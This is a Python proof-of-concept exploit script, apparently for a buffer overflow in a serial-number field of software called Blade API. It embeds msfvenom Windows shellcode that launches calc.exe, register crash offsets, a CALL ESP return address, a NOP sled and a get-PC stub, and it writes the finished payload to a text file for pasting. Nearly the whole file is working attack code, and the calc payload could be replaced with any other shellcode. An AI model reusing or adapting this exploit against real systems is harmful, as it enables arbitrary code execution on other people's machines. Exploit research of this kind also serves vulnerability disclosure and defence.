import sys, struct

filename = "sploit_blade_api.txt"

# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b '\x00\x0a\x0d'
# Size 220 bytes
shellcode =  ""
shellcode += "\xbb\x0e\xfc\x2c\xe1\xda\xc7\xd9\x74\x24\xf4\x58"
shellcode += "\x2b\xc9\xb1\x31\x83\xe8\xfc\x31\x58\x0f\x03\x58"
shellcode += "\x01\x1e\xd9\x1d\xf5\x5c\x22\xde\x05\x01\xaa\x3b"
shellcode += "\x34\x01\xc8\x48\x66\xb1\x9a\x1d\x8a\x3a\xce\xb5"
shellcode += "\x19\x4e\xc7\xba\xaa\xe5\x31\xf4\x2b\x55\x01\x97"
shellcode += "\xaf\xa4\x56\x77\x8e\x66\xab\x76\xd7\x9b\x46\x2a"
shellcode += "\x80\xd0\xf5\xdb\xa5\xad\xc5\x50\xf5\x20\x4e\x84"
shellcode += "\x4d\x42\x7f\x1b\xc6\x1d\x5f\x9d\x0b\x16\xd6\x85"
shellcode += "\x48\x13\xa0\x3e\xba\xef\x33\x97\xf3\x10\x9f\xd6"
shellcode += "\x3c\xe3\xe1\x1f\xfa\x1c\x94\x69\xf9\xa1\xaf\xad"
shellcode += "\x80\x7d\x25\x36\x22\xf5\x9d\x92\xd3\xda\x78\x50"
shellcode += "\xdf\x97\x0f\x3e\xc3\x26\xc3\x34\xff\xa3\xe2\x9a"
shellcode += "\x76\xf7\xc0\x3e\xd3\xa3\x69\x66\xb9\x02\x95\x78"
shellcode += "\x62\xfa\x33\xf2\x8e\xef\x49\x59\xc4\xee\xdc\xe7"
shellcode += "\xaa\xf1\xde\xe7\x9a\x99\xef\x6c\x75\xdd\xef\xa6"
shellcode += "\x32\x11\xba\xeb\x12\xba\x63\x7e\x27\xa7\x93\x54"
shellcode += "\x6b\xde\x17\x5d\x13\x25\x07\x14\x16\x61\x8f\xc4"
shellcode += "\x6a\xfa\x7a\xeb\xd9\xfb\xae\x88\xbc\x6f\x32\x61"
shellcode += "\x5b\x08\xd1\x7d"

# Get Program Counter (to control EIP) via ESI
getpc = (
            "\xEB\x05"                      # jmp short (5 bytes) to 'jmp back' at end
            "\x5E"                              #pop esi
            "\x41"                             #nop (inc ecx)
            "\xFF\xD6"                      #call esi
            "\x41"                              #nop (inc ecx)
            "\xE8\xF6\xFF\xFF\xFF"     #jmp back to pop esi
)

# Lengths
maxlen = 5000

# Offsets
crash_ecx = 544
crash_ebx = 494
crash_ebp = 556
crash_eip = 560
crash_seh = 564

# Notepad Unicode bug: translates characters differently to be able to copy/pase in SN field
notebug = (
                "\xB8\x06\xAA\x6F\x50"
                "\x6F\x4C\x6F\x58\x6F"
                "\x05\x73\x00\x6F\xB0"
                "\xB9\xD8\xAA\x6F\xE8"
)

# Crafting variables
prefix = notebug
prefix += "A" * crash_eip
eip = struct.pack("<L", 0x0041da65)                     # CALL ESP
suffix = "\x90" * 16
suffix += getpc
suffix += shellcode
suffix += "B" * (maxlen - len(prefix + eip + suffix))

# Constructing payload
payload = prefix + eip + suffix

# Write file
f = open(filename, 'wb')
f.write(payload)
f.close()
